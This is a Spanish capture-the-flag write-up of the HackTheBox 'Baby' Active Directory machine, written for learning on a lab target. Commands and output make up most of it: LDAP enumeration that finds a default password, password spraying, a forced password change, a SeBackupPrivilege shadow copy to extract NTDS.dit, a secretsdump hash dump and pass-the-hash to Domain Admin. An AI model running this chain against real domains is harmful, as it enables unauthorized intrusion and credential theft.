---
layout: writeup
title: "HTB - Baby"
date: 2025-10-01
difficulty: "Easy"
platform: "Windows"
description: "Writeup completo de la máquina Baby de HackTheBox."
image: "/assets/images/baby.png"
---
![Baby](/assets/images/baby.png)

## Información de la Máquina

- **Nombre:** Baby
- **SO:** Windows Server 2022
- **Dificultad:** Easy
- **IP:** 10.129.110.163 (puede variar según la instancia)

---

## Reconocimiento

Comenzamos con un escaneo de puertos usando nmap:

```bash
nmap -sS -Pn -p- -oN baby 10.129.110.163
```

### Puertos Abiertos

```
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
9389/tcp  open  adws
```

Los puertos abiertos indican que estamos frente a un **Domain Controller** de Active Directory con los servicios típicos: LDAP, Kerberos, SMB, y WinRM.

---

## Enumeración

### Enumeración LDAP

El primer paso es enumerar LDAP para obtener información del dominio y usuarios. Utilizamos `ldapsearch` para extraer todos los usuarios:

```bash
ldapsearch -x -b "dc=baby,dc=vl" "*" -H ldap://10.129.110.163 | grep userPrincipalName
```

Este comando nos devuelve los siguientes usuarios:

```
userPrincipalName: Jacqueline.Barnett@baby.vl
userPrincipalName: Ashley.Webb@baby.vl
userPrincipalName: Hugh.George@baby.vl
userPrincipalName: Leonard.Dyer@baby.vl
userPrincipalName: Connor.Wilkinson@baby.vl
userPrincipalName: Joseph.Hughes@baby.vl
userPrincipalName: Kerry.Wilson@baby.vl
userPrincipalName: Teresa.Bell@baby.vl
userPrincipalName: Caroline.Robinson@baby.vl
```

**Punto clave:** Caroline.Robinson aparece al final de la lista y está en una OU diferente (OU=it) mientras que la mayoría de usuarios están en OU=dev. Es fácil pasarla por alto en una enumeración rápida.

### Búsqueda de credenciales en LDAP

Continuamos enumerando LDAP buscando información sensible en los atributos de los objetos:

```bash
ldapsearch -x -H ldap://10.129.110.163 -b "dc=baby,dc=vl" | grep "password"
```

Encontramos una descripción reveladora:

```
description: Set initial password to BabyStart123!
```

---

## Acceso Inicial

### Password Spraying

Con la contraseña encontrada (`BabyStart123!`) procedemos a realizar password spraying contra todos los usuarios encontrados:

```bash
netexec smb BABYDC.baby.vl -u users.txt -p 'BabyStart123!' --continue-on-success
```

Resultado:

```
[+] baby.vl\Caroline.Robinson:BabyStart123! (Pwn3d!)
```

Sin embargo, cuando intentamos conectarnos con Evil-WinRM obtenemos un error que indica que **la contraseña debe ser cambiada**.

### Cambio de Contraseña

Utilizamos `impacket-changepasswd` para cambiar la contraseña de Caroline.Robinson:

```bash
impacket-changepasswd baby.vl/Caroline.Robinson:'BabyStart123!'@BABYDC.baby.vl -newpass 'Password123!'
```

Salida:

```
[*] Changing the password of baby.vl\Caroline.Robinson
[*] Connecting to DCE/RPC as baby.vl\Caroline.Robinson
[!] Password is expired or must be changed, trying to bind with a null session.
[*] Connecting to DCE/RPC as null session
[*] Password was changed successfully.
```

### Shell como Caroline.Robinson

Con la nueva contraseña, nos conectamos mediante Evil-WinRM:

```bash
evil-winrm -i 10.129.129.146 -u Caroline.Robinson -p Password123!
```

Una vez dentro, encontramos la flag de usuario:

```powershell
*Evil-WinRM* PS C:\Users\Caroline.Robinson\desktop> type user.txt
[FLAG_AQUÍ]
```

---

## Escalada de Privilegios

### Enumeración de Privilegios

Verificamos los privilegios de nuestro usuario:

```powershell
*Evil-WinRM* PS C:\Users\Caroline.Robinson\desktop> whoami /all
```

Privilegios importantes encontrados:

```
SeBackupPrivilege              Back up files and directories             Enabled
SeRestorePrivilege             Restore files and directories             Enabled
```

Estos privilegios nos permiten leer y escribir cualquier archivo del sistema, incluyendo archivos protegidos.

### Primer Intento: Extracción de SAM (Fallido)

Intentamos extraer los hashes locales guardando los hives SAM y SYSTEM:

```powershell
*Evil-WinRM* PS C:\Users\Caroline.Robinson\desktop> reg save hklm\sam c:\Windows\Tasks\SAM
*Evil-WinRM* PS C:\Users\Caroline.Robinson\desktop> reg save hklm\system c:\Windows\Tasks\SYSTEM
```

Descargamos los archivos y ejecutamos secretsdump:

```bash
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

Obtuvimos hashes, pero al intentar hacer Pass-the-Hash con el hash del Administrator **no funcionó**. Esto es porque el SAM solo contiene cuentas locales, y necesitamos las cuentas del dominio que están en NTDS.dit.

### Segundo Intento: Extracción de NTDS.dit (Exitoso)

Para extraer el NTDS.dit (la base de datos de Active Directory), necesitamos crear una shadow copy del volumen. Utilizamos la técnica descrita en este artículo: [Windows PrivEsc with SeBackupPrivilege](https://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960)

#### Creación de Shadow Copy con DiskShadow

Creamos un archivo de script para diskshadow:

```powershell
*Evil-WinRM* PS C:\Users\Caroline.Robinson\desktop> diskshadow /s backup
```

Contenido del script `backup`:

```
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
set context persistent
begin backup
add volume C: alias cdrive
create
expose %cdrive% E:
end backup
```

Salida exitosa:

```
Info: Upload successful!
*Evil-WinRM* PS C:\Users\Caroline.Robinson> diskshadow /s backup
[...]
Alias cdrive for shadow ID {3535ddd6-95f6-401d-85a0-46d1faee8cba} set as environment variable.
[...]
```

#### Copia del NTDS.dit

Con la shadow copy montada en E:, copiamos el archivo NTDS.dit:

```powershell
*Evil-WinRM* PS C:\Users\Caroline.Robinson> robocopy /b E:\Windows\ntds . ntds.dit

   ROBOCOPY     ::     Robust File Copy for Windows

Started : Tuesday, September 30, 2025 8:26:17 PM
Source : E:\Windows\ntds\
Dest : C:\Users\Caroline.Robinson\Documents\

Files : ntds.dit

New File    16.0 m    ntds.dit
```

#### Extracción de Hashes del NTDS.dit

Descargamos el NTDS.dit y ejecutamos secretsdump:

```bash
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
```

Salida:

```
[*] Target system bootKey: 0x191d5d3fd5b0b51888453de8541d7e88
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 41d56bf9b458d01951f592ee4ba00ea6
[*] Reading and decrypting hashes from ntds.dit
Administrator:500:aad3b435b51404eeaad3b435b51404ee:ee4457ae59f1e3fbd764e33d9cef123d:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[...]
baby.vl\Caroline.Robinson:1115:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
[*] Kerberos keys from ntds.dit
Administrator:aes256-cts-hmac-sha1-96:ad08cbabedf f5acb70049bef721524a23375708cadefcb788704ba00926944f4
```

### Pass-the-Hash como Administrator

Con el hash NTLM del Domain Administrator, nos conectamos mediante Evil-WinRM:

```bash
evil-winrm -i 10.129.129.146 -u Administrator -H ee4457ae59f1e3fbd764e33d9cef123d
```

```
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
*Evil-WinRM* PS C:\Users\Administrator> cd desktop
*Evil-WinRM* PS C:\Users\Administrator\desktop> ls

Directory: C:\Users\Administrator\desktop

Mode    LastWriteTime         Length Name
----    -------------         ------ ----
-ar---  9/30/2025  7:26 PM        34 root.txt
```

Obtenemos la flag de root:

```powershell
*Evil-WinRM* PS C:\Users\Administrator\desktop> type root.txt
[FLAG_AQUÍ]
```

---

## Resumen

1. **Enumeración LDAP exhaustiva** para encontrar todos los usuarios, incluyendo Caroline.Robinson en la OU=it
2. **Credencial por defecto** encontrada en el campo description de LDAP: `BabyStart123!`
3. **Password spraying** identificó que Caroline.Robinson requiere cambio de contraseña
4. **Cambio de contraseña** con impacket-changepasswd
5. **Acceso inicial** via Evil-WinRM como Caroline.Robinson
6. **Abuso de SeBackupPrivilege** para crear shadow copy y extraer NTDS.dit
7. **Extracción de hashes** del Domain Administrator desde NTDS.dit
8. **Pass-the-Hash** para obtener shell como Administrator del dominio

---

## Puntos Clave

- La enumeración exhaustiva de LDAP es crucial. Caroline.Robinson está en una OU diferente y es fácil pasarla por alto.
- El SAM solo contiene cuentas locales. Para comprometer un Domain Controller necesitamos el NTDS.dit.
- SeBackupPrivilege permite crear shadow copies y acceder a archivos protegidos como NTDS.dit.
- La técnica de diskshadow es esencial para extraer NTDS.dit sin detener servicios.

